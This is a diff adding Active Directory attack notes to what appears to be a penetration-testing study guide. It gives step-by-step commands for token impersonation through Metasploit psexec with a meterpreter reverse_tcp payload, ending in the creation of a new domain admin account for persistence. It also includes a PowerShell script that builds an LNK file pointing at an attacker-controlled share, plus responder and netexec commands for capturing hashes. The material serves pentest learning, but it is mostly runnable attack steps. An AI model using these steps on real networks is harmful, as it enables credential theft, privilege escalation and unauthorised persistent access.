@@ -171,6 +171,55 @@ hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
 ````
 
 ![](images/Kerberoasting_Overview.png)
+
 Credit: TCMAcademy
 
 ### Token Impersonation
+You can use psexec or metasploit. https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/access-token-manipultion/token-impersonation\
+Only works with a Domain admin. This attack allows you to create a domain administrator for persistence as long as you have a domain user login information and the domain admin has logged onto the computer.
+
+- Metasploit.
+1. Load `msfconsole`
+2. `search psexec`
+3. Choose `exploit/windows/smb/psexec`
+4. `set payload windows/x64/meterpreter/reverse_tcp`
+5. Set the rhosts, smbuser {as the domain user you're attacking}, smbpass, and smb domain.
+6. `exploit`
+7. `load incognito` The module you'll need for the attack. 
+8. `list_tokens -u` to see if you have an admin.
+9. `impersonate_token {domain}\\{admin}` #Need two backslashes for escape characters.
+10. As the admin you then need to add a user to the right permissions.
+    - `net user /add {username} {password} /domain`
+    - `net group "Domain Admins" {user} /ADD /DOMAIN` #Based on your enumeration use the right name of the domain admins group.
+
+### LNK File Attacks
+A watering hole attack that gets a hash from any user that accesses a share.  Need the file to be at the highest point of the directory so the @ symbol is added. This attack works if you can load the file into the directory via some means, like if you have access to the share.
+
+Additional resources for forced authentication: https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf
+
+1. Create your file from an elevated powershell.
+
+````powershell
+$objShell = New-Object -ComObject WScript.shell
+$lnk = $objShell.CreateShortcut("C:\test.lnk")
+$lnk.TargetPath = "\\{attacker IP}\@test.png"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Test"
+$lnk.HotKey = "Ctrl+Alt+T"
+$lnk.Save()
+````
+
+2. Listen for the connection with responder.
+````bash
+sudo responder -I eth0 -dP
+````
+
+> **Note**
+> ***
+> For responder, You need to have SMB server turned on, and probably HTTP server. It didn't work when I had both off and did work when I turned them both on.
+
+- Using netexec to similar effect
+````bash
+netexec smb {target IP} -d {domain}.local -u {target user} -p {target password} -M slinky -o NAME=test SERVER={attacker IP}
+````
